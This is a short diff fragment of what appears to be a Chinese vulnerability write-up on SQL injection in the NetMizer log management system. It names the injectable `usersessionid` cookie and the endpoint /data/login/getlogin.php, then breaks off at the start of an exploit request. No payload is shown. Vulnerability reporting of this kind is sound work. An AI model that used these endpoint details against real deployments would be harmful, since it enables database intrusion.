@@ -47,19 +47,17 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 深入探索
 
-安全运维服务
+商务软件和生产力软件
 
-信息安全服务
+网络设备
 
-WebService
+编程
 
 Cookie 里的 `usersessionid` 被直接拼接进SQL语句中，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
-
-漏洞利用分析
 
 ```
 GET /data/login/getlogin.php HTTP/1.1
